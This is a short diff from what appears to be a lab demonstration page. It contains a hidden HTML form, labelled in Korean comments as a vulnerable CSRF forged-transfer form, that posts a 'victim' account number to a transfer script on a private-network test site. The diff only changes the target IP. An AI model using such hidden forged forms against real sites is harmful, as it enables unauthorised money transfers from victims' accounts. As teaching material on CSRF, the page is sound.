@@ -26,7 +26,7 @@ button:hover{background:#2196f3;color:white;}
 
 <!-- [취약] 숨겨진 CSRF 위조 이체 폼 -->
 <form id="csrf_form"
-      action="http://192.168.0.2/victim-site/transfer.php"
+      action="http://192.168.0.5/victim-site/transfer.php"
       method="POST"
       style="display:none;">
   <input type="hidden" name="from_account" value="110-123-456789">  <!-- 피해자 계좌 -->
